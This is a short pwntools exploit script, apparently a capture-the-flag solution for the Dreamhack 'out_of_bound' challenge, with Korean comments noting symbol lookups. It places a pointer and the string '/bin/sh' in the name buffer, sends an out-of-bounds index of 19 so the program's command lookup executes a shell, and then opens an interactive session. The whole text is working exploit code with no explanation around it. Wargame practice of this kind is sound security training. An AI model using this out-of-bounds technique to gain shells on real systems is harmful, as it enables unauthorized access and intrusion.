from pwn import *

p = remote('host1.dreamhack.games', 8773)
e = ELF('./out_of_bound')

addr_name = e.symbols['name']				# 주소를 가져온다
addr_command = e.symbols['command']			# 주소를 가져온다

# What do you want? :
payload_1 = p32(addr_name + 4)
payload_1 += b"/bin/sh"

p.recvuntil("name: ")
p.send(payload_1)

p.recvuntil("want?: ")
p.send("19")

p.interactive()
